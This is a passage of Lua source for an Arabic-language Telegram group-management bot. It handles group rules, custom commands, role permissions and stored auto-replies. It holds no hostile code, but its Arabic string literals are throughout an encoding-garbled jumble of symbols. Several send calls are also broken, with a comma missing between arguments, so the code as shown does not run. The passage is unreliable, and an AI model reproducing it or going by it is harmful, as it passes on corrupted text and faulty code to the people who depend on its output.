local f = "π¨βΏΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§Ψ―ΩΩ >> {"..t.."}\nπβΏΩΩΨ§Ψ­ΨΆΩ ΨΉΩΨ§ΩΨ© Ψ§Ω (β―) ΨͺΨΉΩΩ Ψ§Ω Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ―ΩΩ \nπ₯"
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Tshake:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_, "β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΩΩΨ§ΩΩΩ") 
database:del(bot_id.."Tshake:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Tshake:Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"π βΏΨͺΩ Ψ­ΩΨΈ ΩΩΨ§ΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
database:del(bot_id.."Tshake:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == "ΨΆΨΉ ΩΩΨ§ΩΩΩ" or text == "ΩΨΆΨΉ ΩΩΨ§ΩΩΩ" then 
if Addictive(msg) then
database:setex(bot_id.."Tshake:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"π¨βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΨ§ΩΩΩ Ψ§ΩΨ§Ω")  
end
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ§ΩΩΩ" or text == "Ψ­Ψ°Ω Ψ§ΩΩΩΨ§ΩΩΩ" then  
if Addictive(msg) then
send(msg.chat_id_, msg.id_,"π¨βΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΨ§ΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
database:del(bot_id.."Tshake:Set:Rules:Group"..msg.chat_id_) 
end
end
if text == "Ψ§ΩΩΩΨ§ΩΩΩ" then 
local Set_Rules = database:get(bot_id.."Tshake:Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"β«οΈβΏΩΨ§ ΨͺΩΨ¬Ψ― ΩΩΨ§ΩΩΩ ΩΩΨ§")   
end    
end

if text == "Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" and Constructor(msg) then
local list = database:smembers(bot_id.."Tshake:List:Cmd:Group:New"..msg.chat_id_.."")
t = "π‘βΏΩΨ§Ψ¦ΩΩ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ  \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end
if #list == 0 then
t = "π‘βΏΩΨ§ ΨͺΩΨ¬Ψ― Ψ§ΩΨ§ΩΨ± Ψ§ΨΆΨ§ΩΩΩ"
end
send(msg.chat_id_, msg.id_,"["..t.."]")
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" or text == "ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" then
if Constructor(msg) then 
local list = database:smembers(bot_id.."Tshake:List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Tshake:Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
database:del(bot_id.."Tshake:List:Cmd:Group:New"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"π‘βΏΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨͺΩ ΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩΨ§")  
end
end
if text == "Ψ§ΨΆΩ Ψ§ΩΨ±" and Constructor(msg) then
database:set(bot_id.."Tshake:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"π‘βΏΨ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―ΩΩ ..")  
return false
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ±" or text == "ΩΨ³Ψ­ Ψ§ΩΨ±" then 
if Constructor(msg) then
database:set(bot_id.."Tshake:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"π‘βΏΨ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ°Ω ΩΩ Ψ¨ΩΨΆΨΉΩ Ψ¨Ψ―ΩΨ§ ΨΉΩ Ψ§ΩΩΨ―ΩΩ")  
return false
end
end

if text == "Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" and Addictive(msg) then 
local list = database:smembers(bot_id.."Tshake:Coomds"..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,"π¨βΏΩΨ§ ΨͺΩΨ¬Ψ― Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ ΩΨΆΨ§ΩΩ")
return false
end
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ Ψ§ΩΩΨΆΨ§ΩΩ \nβββββββββββββ\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Tshake:Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- "..v.." ~ ("..var..")\n"
else
t = t..""..k.."- "..v.."\n"
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" then
local list = database:smembers(bot_id.."Tshake:Coomds"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Tshake:Comd:New:rt:bot:"..v..msg.chat_id_)
database:del(bot_id.."Tshake:Coomds"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")
end
if text and text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Addictive(msg) then 
ComdNew = text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
database:set(bot_id.."Tshake:Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Tshake:Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Tshake:Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "πβΏΨ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ βοΈ\nπβΏ(ΨΉΨΆΩ ~ ΩΩΩΨ²  ~ Ψ§Ψ―ΩΩ  ~ ΩΨ―ΩΨ± )") 
end
if text and text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Addictive(msg) or text and text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Addictive(msg) then 
ComdNew = text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") or text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
database:del(bot_id.."Tshake:Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "ββΏΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ") 
end
if database:get(bot_id.."Tshake:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
send(msg.chat_id_, msg.id_,"ββΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Tshake:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "ΩΨ―ΩΨ±" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"πβΏΨ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nπβΏΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ (ΨΉΨΆΩ ~ ΩΩΩΨ²  ~ Ψ§Ψ―ΩΩ )") 
return false
end
end
if text == "Ψ§Ψ―ΩΩ" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_"πβΏΨ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nπβΏΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ ( ΨΉΨΆΩ ~ ΩΩΩΨ² )") 
return false
end
end
if text == "ΩΩΩΨ²" then
if not Addictive(msg) then
send(msg.chat_id_, msg.id_"πβΏΨ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nπβΏΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ ( ΨΉΨΆΩ )") 
return false
end
end
if text == "ΩΨ―ΩΨ±" or text == "Ψ§Ψ―ΩΩ" or text == "ΩΩΩΨ²" or text == "ΨΉΨΆΩ" then
local textn = database:get(bot_id.."Tshake:Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Tshake:Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "πβΏΨͺΩ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΨ© ") 
database:del(bot_id.."Tshake:Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") 
database:set(bot_id.."Tshake:Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") 
database:set(bot_id.."Tshake:BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") 
database:set(bot_id.."Tshake:Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") 
database:set(bot_id.."Tshake:Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") 
database:set(bot_id.."Tshake:Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") 
database:set(bot_id.."Tshake:Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ (.*)$") and Owner(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ (.*)$") 
database:set(bot_id.."Tshake:Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"π¨βΏ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ Ψ§ΩΩ Β» "..Teext)
end


if text == ("ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±") and Owner(msg) then
local list = database:smembers(bot_id.."Tshake:List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
database:del(bot_id.."Tshake:Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Tshake:Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id.."Tshake:List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±")
end
if text == ("Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±") and Owner(msg) then
local list = database:smembers(bot_id.."Tshake:List:Manager"..msg.chat_id_.."")
text = "πβΏΩΨ§Ψ¦ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ± \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»\n"
for k,v in pairs(list) do
if database:get(bot_id.."Tshake:Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "ΩΨͺΨ­Ψ±ΩΩ π­"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "Ψ¨Ψ΅ΩΩ π’"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ΩΩΨ΅Ω π"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "Ψ±Ψ³Ψ§ΩΩ β"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "Ψ΅ΩΨ±Ω π"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "ΩΩΨ―ΩΩ πΉ"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ΩΩΩ π"
elseif database:get(bot_id.."Tshake:Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "Ψ§ΨΊΩΩΩ π΅"
end
text = text..""..k..">> ("..v..") Β» {"..db.."}\n"
end
if #list == 0 then
text = "β«οΈβΏΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΩΩΨ―ΩΨ±"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Tshake:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if database:get(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Tshake:Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Tshake:Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Tshake:Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Tshake:Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Tshake:Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Tshake:Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Tshake:Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― Ψ¨ΩΨ¬Ψ§Ψ­")
return false  
end  
end
if text == "Ψ§Ψ³ΨͺΩΨ±Ω" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='ΨͺΩ Ψ§Ψ?ΨͺΩΨ§Ψ± Ψ§ΩΩΩΨ·ΨΉ Ψ§ΩΨ΅ΩΨͺΩ ΩΩ' 
keyboard = {}
keyboard.inline_keyboard = {
{{text = 'αΆΚ° α΅αΆ¦α΅α΅α΅', url="t.me/kkkd"}},
}
local msg_id = msg.id_/2097152/0.5
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/koko12300/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "Ψ§ΨΆΩ Ψ±Ψ―" and Owner(msg) then
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§")
database:set(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "Ψ­Ψ°Ω Ψ±Ψ―" and Owner(msg) then
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§")
database:set(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, 'π βΏΨ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ \nπ βΏ ΩΨ― ΩΩΩΩ (ΩΩΩ - ΩΨ―ΩΩ - ΩΨ΅ - ΩΩΨ΅Ω - Ψ¨Ψ΅ΩΩ - ΩΨͺΨ­Ψ±ΩΩ )\nββΏ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :\n- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \n- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ ')
database:set(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
database:set(bot_id.."Tshake:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Tshake:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Tshake:Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."Tshake:List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―")
database:del(bot_id.."Tshake:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Tshake:Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Tshake:Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Tshake:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."Tshake:List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Tshake:Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Tshake:Spam:Group'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Tshake:Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Tshake:Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Tshake:Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = database:get(bot_id.."Tshake:Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Tshake:Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Tshake:Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Tshake:Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Tshake:Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',message_edit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_, Text)
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr)
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)   
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,photo_caption)
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text == ("ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±") and DevTshake(msg) then 
local list = database:smembers(bot_id.."Tshake:List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Tshake:Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Tshake:Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Tshake:Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Tshake:Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Tshake:Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Tshake:Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Tshake:Add:Rd:Sudo:File"..v)
database:del(bot_id.."Tshake:Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."Tshake:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ ΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±")
end
if text == ("Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±") and DevTshake(msg) then 
